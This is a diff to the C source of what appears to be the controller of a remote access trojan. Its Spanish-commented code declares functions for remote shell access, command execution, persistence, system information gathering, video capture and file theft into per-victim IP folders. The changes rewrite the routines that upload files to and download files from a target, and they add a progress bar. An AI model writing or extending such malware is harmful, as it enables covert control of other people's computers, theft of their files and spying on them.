@@ -34,17 +34,19 @@ const char *CYAN = "\033[0;36m\033[1m";
 const char *GRAY = "\033[0;37m\033[1m";
 
 // Prototipo
+char *replaceFile(char *command, char *toReplace);
 char* decodeSystemInformation(char *codedSysInfo);
 char* getSystemInformation(int targetConn, char *command);
 int mainFunction(int targetConn, char *clientIP, uint16_t clientPort);
 int recvVideoData(char *command, int targetConn, char *clientIP);
-int ReadAndSendFile(int targetConn, char *file, char *instruct);
+int readSendFile(int targetConn, char *filename, char *instruct);
 int shell(int targetConn, char *clientIP, uint16_t clientPort);
 int downloadFunc(char *command, int targetConn, char *ip); 
 int writeAndDecodeData(char *data, char *file, char *ip);
 int setPersistence(int targetConn, char *command);
 int sndAndExecCmd(int targetConn, char *command);
 int startServer();
+long get_file_size(char* filename);
 void closeConection(int targetConn, char *command, size_t instructLen, char *clientIP, uint16_t clientPort);
 void StartGetSysInfo(int targetConn, char *command);
 void StartGetSysInfo(int targetConn, char *command);
@@ -59,6 +61,14 @@ void ctrlCHandler(int sig) {
     printf("\n\n\t%s[!] %sSaliendo: Ctrl + C detectado... %s\n", RED, YELLOW, end);
     close(serverSock);
     exit(1);
+}
+
+long get_file_size(char* filename) {
+    struct stat file_status;
+    if (stat(filename, &file_status) < 0) {
+        return -1;
+    }
+    return file_status.st_size;
 }
 
 void closeConection(int targetConn, char *command, size_t instructLen, char *clientIP, uint16_t clientPort){
@@ -121,53 +131,49 @@ void helpPannel(){
 }
 
 void StartSending(int targetConn, char *instruct){
-    char *file = malloc(strlen(instruct) + 1); // Asigna memoria a 'file'
-    char toReplace[] = "upload ";
-
-    char *substr = strstr(instruct, toReplace);
-    size_t remainingLength = strlen(substr + strlen(toReplace));
-    memmove(file, substr + strlen(toReplace), remainingLength + 1);
-    ReadAndSendFile(targetConn, file, instruct);
+    char *filename = replaceFile(instruct, "upload ");
+    readSendFile(targetConn, filename, instruct);
 
 }
 
-int ReadAndSendFile(int targetConn, char *file, char *instruct){
-    setlocale(LC_ALL, "en_US.UTF-8");
+int readSendFile(int targetConn, char *filename, char *instruct){
+    send(targetConn, instruct, strlen(instruct), 0); 
+    long fullBytes = get_file_size(filename);
 
-    FILE *ptr;
-    // Abrimos el archivo en modo de lectura
-    ptr = fopen(file, "rb");
-
-    if (ptr == NULL) {
-        printf("\n\t%s[!>]%s No se puede abrir el archivo.\n\n", RED, YELLOW); 
-        //send(conn, "No se puede abrir el archivo.\n", strlen("No se puede abrir el archivo.\n"), 0);
+    if (fullBytes == -1){
+        printf("\n\t%s[!>] %sNo se puede abrir el archivo.\n\n", RED, YELLOW);       
         send(targetConn, "end\0", strlen("end\0"), 0);
         return 1;
-    } 
-    
-    send(targetConn, instruct, strlen(instruct), 0); 
-    char buffer[SOCKBUFFER];  // Búfer para leer desde el archivo
-
-    // Inicializamos los búferes con valores nulos 
-    memset(buffer, 0, sizeof(buffer));
-
-    // Lee el archivo en búferes y codifícalo en Base64 antes de enviarlo
-    size_t bytesRead;
-
-    while ((bytesRead = fread(buffer, 1, SOCKBUFFER, ptr)) > 0) {    
-        long input_size = strlen(buffer);      
-        char *base64Encoded = base64_encode(buffer, input_size, &input_size);
-
-        send(targetConn, base64Encoded, strlen(base64Encoded), 0); 
-        free(base64Encoded);  // Liberar la memoria asignada por base64_encode
     }
 
-    // Cierra el archivo
-    fclose(ptr); 
+    FILE *fp;
+    fp = fopen(filename, "rb");
+
+    unsigned char readData[SOCKBUFFER];
+    long fullReaded;
+    long bytesRead;
+    printf("\n");
+
+    while (true){
+        if ((bytesRead = fread(readData, 1, 2047, fp)) <= 0)
+            break;
+
+        readData[bytesRead] = '\0';
+        send(targetConn, (char *)readData, bytesRead, 0);
+        memset(readData, 0, SOCKBUFFER);
+        fullReaded += bytesRead;
+        
+        printProgressBar(fullReaded, fullBytes);
+        
+    }
+
+    printf("\n");
+    fclose(fp);
     sleep(0.3);
     send(targetConn, "end\0", strlen("end\0"), 0); 
     printf("\n\t%s[*>] %sFile Uploaded Successfully.\n\n", YELLOW, BLUE);
     return 0;
+
 }
 
 int sndAndExecCmd(int targetConn, char *command){
@@ -229,84 +235,68 @@ int shell(int targetConn, char *clientIP, uint16_t clientPort){
 
 }
 
-int writeAndDecodeData(char *data, char *file, char *ip){
-    char formed[100];
-    char *base = basename(file);
-    snprintf(formed, SOCKBUFFER, "./DATA/%s/%s", ip, base);
- 
-    FILE *fp;
-    long input_size = strlen(data);      
 
-    char* DecodedData = base64_decode(data, input_size, &input_size); 
-
-    fp = fopen(formed, "w");
-    if (fp == NULL){
-        printf("\n\tError Opening File..\n");
-        return 1;
-    }
-
-    fprintf(fp ,"%s" ,DecodedData);
-    fclose(fp);
-
-
-    printf("\n\t%s[*>] %s File Downloaded Successfully Check ->%s %s\n\n", YELLOW, BLUE, YELLOW, formed, end); 
-    return 0;
-    
-}
-
-int downloadFunc(char *command, int targetConn, char *ip){
-    //Variables necesarias
+char *replaceFile(char *command, char *toReplace){
     char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
-    char toReplace[] = "download ";
 
     char *substr = strstr(command, toReplace);
     size_t remainingLength = strlen(substr + strlen(toReplace));
     memmove(file, substr + strlen(toReplace), remainingLength + 1);
-    printf("\n\t%s[*>] %s Downloading file ->%s %s\n\n", YELLOW, BLUE, YELLOW, file, end);
+    file[remainingLength] = '\0'; 
+
+    return file;
+}
+
+int downloadFunc(char *command, int targetConn, char *ip){
     send(targetConn, command, strlen(command), 0);
-    
-    // Lógica para descargar archivos
-    char recvData[SOCKBUFFER];  // Utilizamos un búfer para recibir datos
-    char *downloadedData = NULL;
-    size_t downloadedSize = 0;
 
-    // Inicializamos el búfer con valores nulos para evitar problemas con strcat
-    memset(recvData, 0, sizeof(recvData));
+    char formed[500];
+    snprintf(formed, SOCKBUFFER, " check path -> ./DATA/%s", ip);
 
-    while (true) {
-        int bytesRead = recv(targetConn, recvData, SOCKBUFFER, 0);
+    // Tamaño máximo del archivo 
+    char bytesStr[100];
+    recv(targetConn, bytesStr, 100, 0);
+    long fullBytes;
+    fullBytes = atoi(bytesStr);
 
-        if (bytesRead <= 0) {
-            // Manejo de error de recepción
-            printf("Error en la recepción de datos.\n");
-            free(downloadedData);
-            free(file);
-            return 1;
-        }
-
-        if (strstr(recvData, "end\0") != NULL) { 
-            // Recibido el indicador de final "end\0"
-            break;
-        } else { 
-            // Añadir los datos recibidos al búfer de descarga
-            char *temp = realloc(downloadedData, downloadedSize + bytesRead);
-            if (temp == NULL) {
-                // Error de memoria
-                free(downloadedData);
-                free(file);
-                return 1;
-            }
-            downloadedData = temp;
-            memcpy(downloadedData + downloadedSize, recvData, bytesRead);
-            downloadedSize += bytesRead;
-        }
+    if (fullBytes == -1){
+        printf("\n\t%s[*>] %sError Downloading file\n", RED, YELLOW);
+        return 1;
     }
 
-    writeAndDecodeData(downloadedData, file, ip);
+    // Encontrar nombre de base (NO RUTA COMPLETA)
+    
+    char *base = basename(replaceFile(command, "download "));
+    printf("\n\t%s[*>] %sDownloading file %s %s%s %s\n\n", YELLOW, BLUE, YELLOW, base, BLUE, formed);
 
-    free(downloadedData);
-    free(file);
-    return 0;
+    // Preparar el bucle de recepción de datos
+    snprintf(formed, SOCKBUFFER, "./DATA/%s/%s", ip, base);  
+    FILE *fp;
+    fp = fopen(formed, "wb");
+    unsigned char recvData[SOCKBUFFER];
+    int bytesReadCurrent = 0;
+    size_t bytesRead = 0;
+
+
+    while (true){
+        bytesReadCurrent = recv(targetConn, (char *)recvData, SOCKBUFFER, 0);
+        
+        if (bytesReadCurrent < 2000){
+            printf("\n%d", bytesReadCurrent);
+            fwrite(recvData, 1, bytesReadCurrent, fp);
+            memset(recvData, 0, SOCKBUFFER);            
+            break;
+        }
+        
+        fwrite(recvData, 1, bytesReadCurrent, fp);
+        bytesRead += bytesReadCurrent;
+        printProgressBar(bytesRead, fullBytes);
+        memset(recvData, 0, SOCKBUFFER);
+    
+    }
+
+    fclose(fp);
+
 }
 
 char* getSystemInformation(int targetConn, char *command){
@@ -392,7 +382,7 @@ void printProgressBar(long current, long total) {
     float progress = (float)current / total;
     int pos = (int)(barWidth * progress);
 
-    printf("%s[%s", YELLOW, end);
+    printf("\t%s[%s", YELLOW, end);
     for (int i = 0; i < barWidth; i++) {
         if (i < pos) {
             printf("%s▓%s", GREEN, end); // Carácter de progreso
